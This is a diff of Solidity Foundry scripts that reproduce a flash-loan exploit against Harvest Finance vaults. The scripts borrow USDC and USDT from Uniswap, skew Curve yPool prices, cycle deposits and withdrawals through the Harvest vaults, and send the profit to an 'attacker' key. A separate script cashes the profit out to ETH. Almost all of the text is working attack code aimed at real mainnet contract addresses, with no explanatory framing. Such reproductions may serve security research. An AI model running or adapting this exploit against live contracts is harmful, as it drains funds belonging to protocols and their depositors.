@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.10;
+pragma solidity ^0.8.27;
 
 import "./interface.sol";
 
@@ -29,7 +29,7 @@ contract Withd is Script {
     address immutable attacker = vm.rememberKey(secret);
 
     // 6 decimals on usdt
-    IERC20 constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
+    IUSDT constant usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
     // 6 decimals on usdc
     IERC20 constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     WETH constant weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
@@ -53,22 +53,25 @@ contract Withd is Script {
 
         IUniswapV2Router router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
         uint256 amountIn = usdt.balanceOf(attacker);
-        usdt.approve(address(router), 0);
+        // usdt.approve(address(router), 0);
         usdt.approve(address(router), amountIn);
         address[] memory path = new address[](2);
         path[0] = address(usdt);
         path[1] = address(weth);
-        router.swapExactTokensForETH(amountIn, 1 ether, path, attacker, type(uint256).max);
+        router.swapExactTokensForETH(amountIn, 0 ether, path, attacker, type(uint256).max);
 
         amountIn = usdc.balanceOf(attacker);
         usdc.approve(address(router), amountIn);
         path[0] = address(usdc);
-        router.swapExactTokensForETH(amountIn, 1 ether, path, attacker, type(uint256).max);
+        router.swapExactTokensForETH(amountIn, 0 ether, path, attacker, type(uint256).max);
 
         console.log("WETH balance: %d", weth.balanceOf(attacker));
         weth.withdraw(weth.balanceOf(attacker));
         console.log("attacker balance: %d %d", attacker.balance / 1e18, attacker.balance % 1e18);
 
+        if (false) {
+            address(0xa6050eE278beff5A1E496C465E1458762d770370).call{value: 100 ether}("");
+        }
         vm.stopBroadcast();
     }
 }
@@ -82,7 +85,7 @@ contract Rw2 is Script {
     // Uniswap ETH/USDT LP (UNI-V2)
     IUniswapV2Pair constant usdtPair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
     // 6 decimals on usdt
-    IERC20 constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
+    IUSDT constant usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
     // 6 decimals on usdc
     IERC20 constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IERC20 constant dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
@@ -103,39 +106,31 @@ contract Rw2 is Script {
         vm.startBroadcast(secret);
         vm.startStateDiffRecording();
 
+        // ex = Exploit(address(0x135bA7F14dB39f76e53F463F753472F4a029a6E7));
         ex = new Exploit();
         vm.label(address(ex), "exploiter");
 
-        consoleStatus();
-
         for (uint256 i = 0; i < 1; ++i) {
-            ex.run();
+            ex.run(1);
         }
-        require(usdc.balanceOf(attacker) > 0 || usdt.balanceOf(attacker) > 0, "Not enough funds");
+        // require(usdc.balanceOf(attacker) > 0 || usdt.balanceOf(attacker) > 0, "Not enough funds");
 
-        consoleStatus();
+        // IUniswapV2Router router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
 
-        console.log(usdcPair.balanceOf(attacker));
-        console.log(usdtPair.balanceOf(attacker));
+        // address[] memory path = new address[](2);
+        // path[0] = address(usdt);
+        // path[1] = address(weth);
+        // uint256 amountIn = usdt.balanceOf(attacker);
+        // usdt.approve(address(router), 0);
+        // usdt.approve(address(router), amountIn);
+        // router.swapExactTokensForETH(amountIn, 1 ether, path, attacker, type(uint256).max);
 
-        // Approve USDC and USDT for swapping
+        // path[0] = address(usdc);
+        // amountIn = usdc.balanceOf(attacker);
+        // usdc.approve(address(router), amountIn);
+        // router.swapExactTokensForETH(amountIn, 1 ether, path, attacker, type(uint256).max);
 
-        // Swap all USDC for WETH
-        // usdcPair.swap(100 ether, 0, msg.sender, new bytes(0));
-
-        // Swap all USDT for WETH
-        // usdt.approve(address(usdtPair), usdt.balanceOf(attacker));
-        // usdtPair.swap(0, 123 * 1e6, msg.sender, new bytes(0));
-
-        // Withdraw WETH to ETH
-
-        // Log the attacker's ETH balance
-        console.log("attacker balance: %d %d", attacker.balance / 1e18, attacker.balance % 1e18);
-
-        // Stop the script and return the state diff
-
-        // Vm.AccountAccess[] memory records = vm.stopAndReturnStateDiff();
-        // console.log("State diff: %d", records.length);
+        // consoleStatus();
 
         vm.stopBroadcast();
     }
@@ -178,54 +173,40 @@ contract Exploit is IUniswapV2Callee {
     // Curve y swap
     IcurveYSwap curveYSwap = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51); // yCurve
     // Harvest USDC pool
-    IHarvestVault harvest = IHarvestVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
-    // IHarvestVault harvest = IHarvestVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
-
-    // h = HVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
-    // ● c = CurveStrategy(0x1C47343eA7135c2bA3B2d24202AD960aDaFAa81c);
-    // ● y = yCurve(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
-    // ● uUSDT = UniSwapV2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
-    // ● uUSDC = UniSwapV2(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
-    // ● usdt = ERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
-    // ● usdc = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-
-    // ERC20s
-    // 6 decimals on usdt
-    IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
-    // 6 decimals on usdc
-    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    // 6 decimals on yusdc
-    IERC20 yusdc = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);
-    // 6 decimals on yusdt
-    IERC20 yusdt = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
-    // 6 decimals on fUSDT
-    IERC20 fusdt = IERC20(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
-    // 6 decimals on fUSDC
+    IHarvestVault hVaultUsdc = IHarvestVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
     IERC20 fusdc = IERC20(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
 
-    // uint256 usdcLoan = 10_000_000 * 10 ** 6;
-    uint256 usdcLoan = 39_000_000 * 10 ** 6;
+    IHarvestVault hVaultUsdt = IHarvestVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
+    IERC20 fusdt = IERC20(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
+
+    IUSDT usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
+    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+
+    IERC20 yusdc = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);
+    IERC20 yusdt = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
+
+    uint256 usdcLoan = 13_000_000 * 10 ** 6;
     uint256 usdcRepayment = (usdcLoan * 100_301) / 100_000;
 
-    // uint256 usdtLoan = 50_000_000 * 10 ** 6;
-    uint256 usdtLoan = 10_000_000 * 10 ** 6;
+    uint256 usdtLoan = 50_000_000 * 10 ** 6;
     uint256 usdtRepayment = (usdtLoan * 100_301) / 100_000;
 
     event log_named_uint(string name, uint256 value);
 
-    function run() external {
-        // usdt.approve(address(curveYSwap), 0);
-        // usdt.approve(address(harvest), 0);
-        // usdt.approve(address(usdtPair), 0);
-
+    constructor() {
         // usdt.approve(address(curveYSwap), type(uint256).max);
-        // usdt.approve(address(harvest), type(uint256).max);
-
+        // usdt.approve(address(hVaultUsdt), type(uint256).max);
+        // usdt.approve(address(usdtPair), type(uint256).max);
         usdc.approve(address(curveYSwap), type(uint256).max);
-        usdc.approve(address(harvest), type(uint256).max);
+        usdc.approve(address(hVaultUsdc), type(uint256).max);
         usdc.approve(address(usdcPair), type(uint256).max);
+    }
 
-        testExploit();
+    function run(uint256 iter) external {
+        for (uint256 i = 0; i < iter; i++) {
+            testExploit();
+        }
+
         // (bool res,) = attacker.call{value: address(this).balance}("");
         usdt.transfer(attacker, usdt.balanceOf(address(this)));
         usdc.transfer(attacker, usdc.balanceOf(address(this)));
@@ -258,72 +239,78 @@ contract Exploit is IUniswapV2Callee {
             // emit log_named_uint("Flashloan, Amount of USDT received:", usdt.balanceOf(address(this)) / 1e6);
             // for (uint256 i = 0; i < 4; i++) {
 
-            for (uint256 i = 0; i < 1; i++) {
-                theSwap_2(i);
+            console.log("%d %d", usdc.balanceOf(address(this)), usdt.balanceOf(address(this)));
+            console.log("%d %d", usdcRepayment, usdtRepayment);
+            // console.log("%d %d", fusdc.balanceOf(address(this)), fusdt.balanceOf(address(this)));
+
+            for (uint256 i = 0; i < 5; i++) {
+                theSwap();
             }
+
+            require(usdt.balanceOf(address(this)) >= usdtRepayment, "Not enough USDT balance");
+            usdt.approve(address(usdtPair), 0);
+            usdt.approve(address(usdtPair), usdtRepayment);
+            require(usdt.allowance(address(this), address(usdtPair)) >= usdtRepayment, "Not enough USDT allowance");
             usdt.transfer(address(usdtPair), usdtRepayment);
         }
     }
 
-    function theSwap_2(uint256 i) internal {
-        {
-            uint256 amount = usdtLoan * 100_300 / 100_000;
-            usdt.approve(address(curveYSwap), amount);
-            curveYSwap.exchange_underlying(2, 1, amount, 0); // USDT -> USDC which increases the price of USDC
-        }
-        console.log("%d %d", usdc.balanceOf(address(this)), usdt.balanceOf(address(this)));
-        console.log("%d %d", fusdc.balanceOf(address(this)), fusdt.balanceOf(address(this)));
-        console.log("%d %d", usdcRepayment, usdtRepayment);
+    function theSwap() internal {
+        uint256 amount_swap;
+        amount_swap = usdc.balanceOf(address(this));
+        exchangeUSDCtoUSDT(amount_swap);
+        amount_swap = usdcRepayment * 1000 / 997;
 
-        require(address(harvest) == 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
-        harvest.deposit(usdcLoan);
+        uint256 amount_deposit;
+        amount_deposit = usdt.balanceOf(address(this)) - amount_swap;
+        depositUSDTtoHarvestUsdtVault(amount_deposit);
 
-        curveYSwap.exchange_underlying(1, 2, usdtLoan, 0);
+        consoleStatus();
 
-        console.log("%d %d", usdc.balanceOf(address(this)), usdt.balanceOf(address(this)));
-        console.log("%d %d", fusdc.balanceOf(address(this)), fusdt.balanceOf(address(this)));
-        console.log("%d %d", usdcRepayment, usdtRepayment);
+        exchangeUSDTtoUSDC(amount_swap);
 
-        harvest.withdraw(fusdc.balanceOf(address(this)));
-
-        console.log("%d %d", usdc.balanceOf(address(this)), usdt.balanceOf(address(this)));
-        console.log("%d %d", fusdc.balanceOf(address(this)), fusdt.balanceOf(address(this)));
-        console.log("%d %d", usdcRepayment, usdtRepayment);
-
-        // curveYSwap.exchange_underlying(2, 1, (usdcRepayment - usdcLoan) * 103 / 100, 0);
-
-        console.log("%d %d", usdc.balanceOf(address(this)), usdt.balanceOf(address(this)));
-        console.log("%d %d", fusdc.balanceOf(address(this)), fusdt.balanceOf(address(this)));
-        console.log("%d %d", usdcRepayment, usdtRepayment);
-
-        // emit log_named_uint("After swap, USDC balance of attacker:", usdc.balanceOf(address(this)) / 1e6);
-        // emit log_named_uint("After swap, USDT balance of attacker:", usdt.balanceOf(address(this)) / 1e6);
+        withdrawFUsdtFromHarvestUsdtVault();
     }
 
-    function theSwap(uint256 i) internal {
-        curveYSwap.exchange_underlying(1, 2, usdcLoan, 0); // USDC -> USDT which increases the price of USDT
-        console.log("%d %d", usdc.balanceOf(address(this)), usdt.balanceOf(address(this)));
+    function exchangeUSDTtoUSDC(uint256 amount) public {
+        usdt.approve(address(curveYSwap), 0);
+        usdt.approve(address(curveYSwap), amount);
 
-        usdt.approve(address(harvest), usdtLoan);
-        harvest.deposit(usdtLoan);
-        // emit log_named_uint("After deposit, fUSDT balance of attacker:", fusdt.balanceOf(address(this)));
-        {
-            uint256 amount = usdcLoan * 100_300 / 100_000;
-            usdt.approve(address(curveYSwap), amount);
-            curveYSwap.exchange_underlying(2, 1, amount, 0);
-        }
-
-        harvest.withdraw(fusdt.balanceOf(address(this)));
-
-        // curveYSwap.exchange_underlying(2, 1, (usdcRepayment - usdcLoan) * 103 / 100, 0);
-
-        console.log("%d %d", usdc.balanceOf(address(this)), usdt.balanceOf(address(this)));
-        console.log("%d %d", fusdc.balanceOf(address(this)), fusdt.balanceOf(address(this)));
-        console.log("%d %d", usdcRepayment, usdtRepayment);
-
-        // emit log_named_uint("After swap, USDC balance of attacker:", usdc.balanceOf(address(this)) / 1e6);
-        // emit log_named_uint("After swap, USDT balance of attacker:", usdt.balanceOf(address(this)) / 1e6);
+        curveYSwap.exchange_underlying(2, 1, amount, 0);
     }
 
-    receive() external payable {}
+    function exchangeUSDCtoUSDT(uint256 amount) public {
+        usdc.approve(address(curveYSwap), amount);
+        curveYSwap.exchange_underlying(1, 2, amount, 0);
+    }
+
+    function depositUSDTtoHarvestUsdtVault(uint256 amount) public {
+        usdt.approve(address(hVaultUsdt), 0);
+        usdt.approve(address(hVaultUsdt), amount);
+        hVaultUsdt.deposit(amount);
+    }
+
+    function depositUSDCtoHarvestUsdcVault(uint256 amount) public {
+        usdc.approve(address(hVaultUsdc), amount);
+        hVaultUsdc.deposit(amount);
+    }
+
+    function withdrawFUsdtFromHarvestUsdtVault() public {
+        fusdt.approve(address(hVaultUsdt), fusdt.balanceOf(address(this)));
+        hVaultUsdt.withdraw(fusdt.balanceOf(address(this)));
+    }
+
+    function withdrawFUsdcFromHarvestUsdcVault() public {
+        hVaultUsdc.withdraw(fusdc.balanceOf(address(this)));
+    }
+
+    function consoleStatus() internal view {
+        console.log("Attacker balance: ", address(this).balance);
+        console.log("USDC balance: ", usdc.balanceOf(address(this)));
+        console.log("USDT balance: ", usdt.balanceOf(address(this)));
+        console.log("fUSDC balance: ", fusdc.balanceOf(address(this)));
+        console.log("fUSDT balance: ", fusdt.balanceOf(address(this)));
+        console.log("yUSDC balance: ", yusdc.balanceOf(address(this)));
+        console.log("yUSDT balance: ", yusdt.balanceOf(address(this)));
+    }
 }
